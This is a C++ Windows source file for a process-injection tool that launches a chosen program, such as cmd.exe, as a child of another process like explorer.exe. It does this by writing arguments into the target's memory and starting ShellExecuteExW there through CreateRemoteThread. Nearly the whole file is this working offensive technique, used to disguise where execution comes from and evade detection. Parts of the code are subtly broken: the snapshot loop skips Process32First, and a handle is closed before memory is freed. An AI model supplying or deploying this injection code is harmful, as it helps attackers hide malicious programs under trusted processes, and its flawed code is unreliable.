#include <iostream>
#include <Windows.h>
#include <DbgHelp.h>
#include <Psapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "dbghelp.lib")

#define MAXPATHLEN 255

void Error(const char* name) {
	printf("%s Error: %d\n", name, GetLastError());
	exit(-1);
}

void ErrorContinue(const char* name) {
	printf("%s Error: %d\n", name, GetLastError());
	return;
}

// Find PID by looking at process snapshots
DWORD getPid(const char* name) {
	HANDLE hSnap;
	PROCESSENTRY32 pt;
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	do {
		if (!strcmp(pt.szExeFile, name)) {
			DWORD pid = pt.th32ProcessID;
			CloseHandle(hSnap);
			return pid;
		}
	} while (Process32Next(hSnap, &pt));
	CloseHandle(hSnap);
	return 0;
}

// Find symbol address based on a process snapshot
bool LoadSymbolModule(const char* name, HANDLE hProcess) {
	MODULEENTRY32 me = { 0 };
	HANDLE hSnap;
	DWORD64 returnAddress = 0;
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));
	if (hSnap != INVALID_HANDLE_VALUE) {
		me.dwSize = sizeof(me);
		if (Module32First(hSnap, &me)) {
			do {
				if (_stricmp(me.szModule, name) == 0) {
					returnAddress = SymLoadModuleEx(hProcess, NULL, me.szExePath, me.szModule, (DWORD64)me.modBaseAddr, me.modBaseSize, NULL, 0);
					break;
				}
			} while (Module32Next(hSnap, &me));
		}
		CloseHandle(hSnap);
	}
	return returnAddress != 0;
}


int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
	DWORD bytesWritten;
	char processName[MAXPATHLEN];
	// Argument parsing
	if (argc != 3) {
		printf("Example Usage:\n");
		printf("adopt.exe explorer.exe C:\\\\windows\\\\system32\\\\cmd.exe");
		return 0;
	}
	wchar_t* path = argv[2];
	wchar_t  dir[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, dir);

	// Get PID for target process (explorer.exe)
	wcstombs(processName, argv[1], sizeof(processName));
	DWORD pid = getPid(processName);
	printf("[>] Target pid is %d\n", pid);

	// Open remote process (we can do that because its the same user, SeDebugPrivilege would also work if targetting another users process)
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	// Get address of remote process function ShellExecuteExW (it imports that one already)
	if (!SymInitialize(hProcess, NULL, FALSE)) {
		Error("SymInitialize");
	}
	if (!LoadSymbolModule("shell32.dll", hProcess)) {
		Error("LoadSymbolModule shell32.dll");
	}
	SYMBOL_INFO symbol = { 0 };
	symbol.SizeOfStruct = sizeof(symbol);
	if (!SymFromName(hProcess, "ShellExecuteExW", &symbol) || symbol.Address == 0) {
		ErrorContinue("SymFromName ShellExecuteExW");
	}
	LPTHREAD_START_ROUTINE funcAddr = reinterpret_cast <LPTHREAD_START_ROUTINE>(symbol.Address);
	printf("[>] ShellExecuteExW is at %p\n", funcAddr);

	// Allocate memory for file path in remote process & write bytes there
	void* pathArgAlloc = VirtualAllocEx(hProcess, NULL, MAXPATHLEN, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pathArgAlloc == nullptr) {
		Error("VirtualAllocEx");
	}
	if (!WriteProcessMemory(hProcess, pathArgAlloc, path, MAXPATHLEN, (SIZE_T*)&bytesWritten)) {
		Error("WriteProcessMemory");
	}
	//printf("[>] Written %d bytes for path\n", bytesWritten);

	// Allocate memory for directory in remote process & write bytes there
	void* dirArgAlloc = VirtualAllocEx(hProcess, NULL, MAXPATHLEN, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (dirArgAlloc == nullptr) {
		Error("VirtualAllocEx");
	}
	if (!WriteProcessMemory(hProcess, dirArgAlloc, dir, MAXPATHLEN, (SIZE_T*)&bytesWritten)) {
		Error("WriteProcessMemory");
	}
	//printf("[>] Written %d bytes for path\n", bytesWritten);

	// Prepare argument structure (it has exactly 1 argument, this struct) and allocate memory for file path in remote process & write bytes there
	SHELLEXECUTEINFOW info = { 0 };
	info.cbSize = sizeof(SHELLEXECUTEINFOW);
	info.lpFile = (LPCWSTR)pathArgAlloc;
	info.lpDirectory = (LPCWSTR)dirArgAlloc;
	info.nShow = SW_MINIMIZE;
	void* funcArgsAlloc = VirtualAllocEx(hProcess, NULL, sizeof(info), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (funcArgsAlloc == nullptr) {
		Error("VirtualAllocEx");
	}
	//printf("[>] Args are at %llx\n", funcArgsAlloc);	
	if (!WriteProcessMemory(hProcess, funcArgsAlloc, &info, sizeof(info), (SIZE_T*)&bytesWritten)) {
		Error("WriteProcessMemory");
	}
	//printf("[>] Written %d bytes for argument struct\n", bytesWritten);

	// Run the remote function with the argument we prepared
	HANDLE thread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, funcArgsAlloc, NULL, NULL);
	printf("[>] Thread running, done! (Handle: %d)\n", thread);

	DWORD result = WaitForSingleObject(thread, 3 * 1000);
	if (result != WAIT_OBJECT_0) {
		Error("WaitForSingleObject");
	}

	CloseHandle(hProcess);	
	VirtualFreeEx(hProcess, dirArgAlloc, 0, MEM_RELEASE);
	VirtualFreeEx(hProcess, pathArgAlloc, 0, MEM_RELEASE);
	VirtualFreeEx(hProcess, funcArgsAlloc, 0, MEM_RELEASE);
	return 0;
}